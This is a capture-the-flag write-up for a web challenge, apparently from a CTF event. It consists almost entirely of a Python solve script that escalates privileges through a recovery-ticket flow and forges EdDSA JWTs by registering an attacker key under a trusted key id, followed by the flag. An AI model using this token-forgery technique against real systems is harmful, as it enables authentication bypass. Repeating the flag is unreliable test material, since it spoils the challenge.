# Fear Hole

- Write-Up Author: Ben Ten
- Category: Web
- Flag: `Kaito{th3_d00r_w45_n3v3r_1n_th3_r00m_58e4c12a}`

## Challenge Description

![Fear Hole Guy inside Rick27s car](./assets/Fear_Hole_Guy_inside_Rick27s_car.jpg)

"Hi! Welcome to the Hole. Here's how it works: you jump in, the Hole manifests your greatest fear, you conquer that fear and come out, well, fearless. And you get your picture on the wall! What does the Hole get out of it? Well, you know those fish that nibble dead skin off your feet? Well, the Hole's kinda like that. It eats fear. You win, it wins. Have fun and enjoy the Hole!"

## Steps to Find the Flag

```python
import requests
import jwt
import time
import secrets
import base64
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

def b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

class OurKey:
    def __init__(self, kid):
        self.kid = kid
        self.private = Ed25519PrivateKey.generate()

    def jwk(self):
        return {
            "kty": "OKP", "crv": "Ed25519", "alg": "EdDSA", "use": "sig",
            "kid": self.kid,
            "x": b64(self.private.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)),
        }

    def sign(self, issuer, audience, subject, **claims):
        now = int(time.time())
        body = dict(iss=issuer, aud=audience, sub=subject, iat=now, exp=now + 300, jti=secrets.token_hex(16))
        body.update(claims)
        return jwt.encode(body, self.private, algorithm="EdDSA", headers={"kid": self.kid})

s = requests.Session()
url = "https://fear-no-mort-z8ypyr3g.instance.tbf1.online"

r = s.post(f"{url}/api/admissions", json={"name": "hacker"})
data = r.json()
arrival_slip = data["arrival_slip"]
admission_id = data["admission"]
s.headers.update({"X-Desk-CSRF": data["csrf"]})

r = s.post(f"{url}/api/practice", json={"alias": "r.sanchez"})
r = s.post(f"{url}/api/recovery/request", json={"realm": r.json()["realm"]})
s.post(f"{url}/api/recovery/redeem", json={"ticket": r.json()["ticket"], "realm": data["realm"]})

r = s.post(f"{url}/api/interviews", json={})
interview_id = r.json()["id"]

r = s.get(f"{url}/api/reception/manifest")
manifest = r.json()

our_key = OurKey(manifest["scheduled_key"]["kid"])
r = s.post(f"{url}/api/examiners", json={"jwk": our_key.jwk()})
test_token = our_key.sign(r.json()["issuer"], "night-desk:examiner", r.json()["subject"], nonce=r.json()["nonce"], realm=data["realm"], admission=admission_id)
s.post(f"{url}/api/examiners/test", json={"attestation": test_token})

r = s.post(f"{url}/api/interviews/return", json={"interview": interview_id})

discharge_token = our_key.sign(manifest["issuer"], "night-desk:discharge", manifest["subject"], admission=admission_id, nonce=jwt.decode(arrival_slip, options={"verify_signature": False})["nonce"], epoch=r.json()["epoch"])
r = s.post(f"{url}/api/reception/discharge", json={"attestation": discharge_token, "arrival_slip": arrival_slip})
print("Flag:", r.json().get("flag"))
```

## Conclusion

Penggabungan cacat logika *Privilege Escalation* dengan kerentanan JWT *Cache Poisoning* memungkinkan pengambilalihan hak akses penuh secara *bypass*.

**Flag:** `Kaito{th3_d00r_w45_n3v3r_1n_th3_r00m_58e4c12a}`
